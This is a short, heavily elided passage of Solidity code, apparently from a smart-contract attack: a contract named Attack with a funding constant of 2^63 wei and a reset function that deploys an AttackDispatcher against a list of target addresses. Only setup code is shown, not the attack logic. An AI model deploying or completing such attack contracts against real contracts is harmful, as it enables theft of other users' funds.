 ...
 * parameter. Make sure to send at least 9 ether and 223372036854775808 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x8000000000000000; /* equals 9 ether and 223372036854775808 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 9223372036854775807 }(0, _targets);
    }
